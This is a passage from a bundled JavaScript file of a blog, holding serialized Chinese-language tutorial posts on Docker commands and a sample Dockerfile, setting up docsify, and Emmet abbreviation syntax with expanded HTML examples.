docker，可將此使用者加至 <code>docker</code> 身份組中\n<br>└ <code>sudo usermod -aG docker your-user</code></li>\n</ul>\n<h2 id=\"使用\">使用</h2>\n<ul>\n<li><code>docker images</code>：查看 images</li>\n<li><code>docker run</code>：執行 images</li>\n<li><code>docker ps</code>：查看執行中的 container</li>\n<li>撰寫 Dockerfile</li>\n</ul>\n<pre class=\"language-dockerfile\"><code class=\"language-dockerfile\"># fetch node v4 LTS codename argon\nFROM node:argon\n\n# Request samplename build argument\nARG samplename\n\n# Create app directory\nRUN mkdir -p /usr/src/spfx-samples\nWORKDIR /usr/src/spfx-samples\n\n# Install app dependencies\nRUN git clone https://github.com/SharePoint/sp-dev-fx-webparts.git .\nWORKDIR /usr/src/spfx-samples/samples/$samplename\n\n# Install gulp on a global scope\nRUN npm install gulp -g\n\n# RUN [\"npm\", \"install\", \"gulp\"]\nRUN npm install\nRUN npm cache clean\n\n# Expose required ports\nEXPOSE 4321 35729 5432\n\n# Run Sample\nCMD [\"gulp\", \"serve\"]</code></pre><ul>\n<li><p>監看工具: <code>top</code>、<code>htop</code>、<code>ctop</code>、<code>gtop</code>、<code>conky</code></p>\n</li>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/gold-kou/items/44860fbda1a34a001fc1\">いまさらだけど Docker に入門したので分かりやすくまとめてみた - Qiita</a></p>\n</li>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Michinosuke/items/5778e0d9e9c04038903c\">Docker を体系的に学べる公式チュートリアル和訳 - Qiita</a></p>\n</li>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/etaroid/items/b1024c7d200a75b992fc\">【図解】Docker の全体像を理解する -前編-</a></p>\n</li>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/bremen/items/4604f530fe25786240db\">「Docker」を全く知らない人のために「Docker」の魅力を伝えるための「Docker」入門</a></p>\n</li>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/takuya_tsurumi/items/182d2de3f3ce7bb63edb\">Docker を体系的に学び直してみた(導入編)</a></p>\n</li>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/yoskeoka/items/01c52c069123e0298660\">Docker で立ち上げた開発環境を VS Code で開く!</a></p>\n</li>\n</ul>\n","date":"2020-08-21T15:12:42.000Z","excerpt":"","printDate":"August 21, 2020","printReadingTime":"2 min read"};

var route_75 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod47
});

var Mod48 = {"title":"從 Markdown 即時轉譯成網頁樣板 docsify","slug":"docsify","html":"<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://docsify.js.org/#/quickstart\">Quick start</a></li>\n</ul>\n<p>Docsify 是一套以 Vue 為基底撰寫，即時解析 markdown 檔案產生網頁頁面的靜態網站產生器，特徵是初始化完畢後，只需要 <code>index.html</code> 和 markdown 檔案即可運作，不需進行 build。</p>\n<h2 id=\"安裝\">安裝</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">npm i docsify-cli -g\n\n# 初始化\ndocsify init ./檔案放置資料夾\n\n# 預覽\ndocsify serve docs</code></pre><h2 id=\"檔案結構\">檔案結構</h2>\n<p>初始化後，此資料夾底下會有三個檔案</p>\n<ul>\n<li><code>index.html</code>：主頁面（進入點），以及與設置相關的內容</li>\n<li><code>README.md</code>：主頁面（進入點）內容</li>\n<li><code>.nojekyll</code>：使 Github Pages 不忽略名稱以 <code>_</code> 開頭的檔案</li>\n</ul>\n<h3 id=\"路由\">路由</h3>\n<p>Docsify 以資料夾進行分層，並藉此決定路徑：</p>\n<pre class=\"language-\"><code class=\"language-\">.\n├── 檔案放置資料夾\n│   ├── 2017\n│   ├── 2018\n│   ├── 2019\n│   │   ├── YYYYMMDD_作業事項\n│   │   │   ├── README.md    // 說明書\n│   │   │   ├── _sidebar.md  // 側邊欄（資料樹狀大綱）\n│   │   │   └── image.png    // 說明書內的使用圖片\n│   │   ├── YYYYMMDD_作業事項\n│   │   │   ...\n│   │   └── README.md\n│   ├── .nojekyll\n│   ├── README.md\n│   ├── _sidebar.md\n│   └── index.html\n├── node_modules\n├── package.json\n├── script\n└── yarn.lock</code></pre><p>並且可透過 <code>_sidebar.md</code> 或 <code>_navbar.md</code> 加入側邊欄與下拉選單，指引用檔案的內容以清單格式撰寫：</p>\n<pre class=\"language-markdown\"><code class=\"language-markdown\">- [需求規格](/spec/ \"需求規格\")\n  - [內容 A](/spec/contentA/ \"內容A\")\n  - [內容 B](/spec/contentB/ \"內容B\")\n- [時程安排](/schedule/ \"時程安排\")\n- [開發者技術](/dev/ \"開發者技術\")\n- [API 文件](/api/ \"API 文件\")\n- [DB schema](/dbSchema/ \"DB schema\")\n- [其他文件紀錄](/otherDocument/ \"其他文件紀錄\")</code></pre><h2 id=\"deploy\">Deploy</h2>\n<p>如前面說的，Docsify 只需要 <code>index.html</code> 和 markdown 檔案即可運作，deploy 亦只需要處理這兩者即可，詳細步驟可以參照官方文件 <a target=\"_blank\" rel=\"nofollow\" href=\"https://docsify.js.org/#/deploy\">Deploy</a>。</p>\n","date":"2020-10-14T03:51:04.000Z","excerpt":"","printDate":"October 14, 2020","printReadingTime":"1 min read"};

var route_73 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod48
});

var Mod49 = {"title":"使用 Emmet 快速完成內容","slug":"editor-Emmet","html":"<ul>\n<li>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.fly63.com/article/detial/128\">前端必知的 Emmet 实用操作，大致了解了下 Emmet 这个神器</a></li>\n</ul>\n<h2 id=\"簡介\">簡介</h2>\n<p>作為一個前端，你肯知道在前端開發的過程中，一大部分的工作是寫 HTML、CSS 代碼。</p>\n<p>特別是手動編寫 HTML 代碼的時候，效率會特別低下，因為需要敲打很多尖括號，而且很多標籤都需要閉合標籤等。</p>\n<p>於是，就有了 Emmet（前身為 Zen Coding）。(當然這是以前的情況，現在作為一個合格的現代編輯器多多少少都集成了代碼自動提示，自動補全等功能)。</p>\n<p>它作為一款強大的插件支持了許多編輯器與 IDE，什麼 vscode，sublime，atom，webstorm 等等都支持你可以直接在你的編輯器插件中搜索安裝，一些已自帶集成</p>\n<p>我們先來看看官網的示例：\n<code>#page&gt;div.logo+ul#nav&gt;li*5&gt;a{Item $}</code></p>\n<p>在我們用了 emmet 後 一個 tap 就會生成下面這一大段。酷不酷炫，炫不炫酷</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>page<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>logo<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>nav<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Item 1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Item 2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Item 3<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Item 4<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Item 5<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><h2 id=\"速見表\">速見表</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://docs.emmet.io/cheat-sheet/\">cheat sheet</a></li>\n<li>子元素: <code>&gt;</code></li>\n<li>相鄰元素: <code>+</code></li>\n<li>上級元素: <code>^</code></li>\n<li>產生複數元素: <code>*</code></li>\n<li>包裝區域元素: <code>()</code></li>\n<li>ID: <code>#</code></li>\n<li>CLASS: <code>.</code></li>\n<li>元素屬性: <code>[]</code></li>\n<li>遞增: <code>$</code></li>\n<li>自訂遞增遞減: <code>@</code></li>\n<li>元素內容: <code>{}</code></li>\n<li>假文: <code>lorem</code></li>\n</ul>\n<h2 id=\"emmet-語法\">Emmet 語法</h2>\n<h2 id=\"標籤\">標籤</h2>\n<ul>\n<li><code>div</code> ⟹ <code>&lt;div&gt;&lt;/div&gt;</code></li>\n<li><code>foo</code> ⟹ <code>&lt;foo&gt;&lt;/foo&gt;</code></li>\n</ul>\n<h3 id=\"後代：\">後代： <code>&gt;</code></h3>\n<ul>\n<li><code>div&gt;ul&gt;li</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"兄弟：\">兄弟：<code>+</code></h3>\n<ul>\n<li><code>div+p+bq</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>blockquote</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>blockquote</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"上級：\">上級：<code>^</code></h3>\n<ul>\n<li><code>div+div&gt;p&gt;span+em^bq</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>em</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>em</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>blockquote</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>blockquote</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"乘法：\">乘法：<code>*</code></h3>\n<ul>\n<li><code>ul&gt;li*5</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"分組：\">分組：<code>()</code></h3>\n<ul>\n<li><code>div&gt;(header&gt;ul&gt;li*2&gt;a)+footer&gt;p</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>header</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>header</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>footer</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>footer</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"id-和-class\">ID 和 CLASS</h3>\n<ul>\n<li><code>div#header+div.page+div#footer.class1.class2.class3</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>header<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>page<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>footer<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>class1 class2 class3<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n    自定義屬性 td[title=\"Hello world!\" colspan=3] ⟹\n\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span> <span class=\"token attr-name\">title</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Hello world!<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">colspan</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>3<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"自增符號：\">自增符號：<code>$</code></h3>\n<ul>\n<li><code>ul&gt;li.item$*5</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item2<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item3<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item4<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item5<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"改變自增基數和方向：\">改變自增基數和方向：<code>@</code></h3>\n<ul>\n<li><code>ul&gt;li.item$@-*5</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item5<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item4<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item3<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item2<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span></code></pre><ul>\n<li><code>ul&gt;li.item$@3*5</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item3<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item4<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token 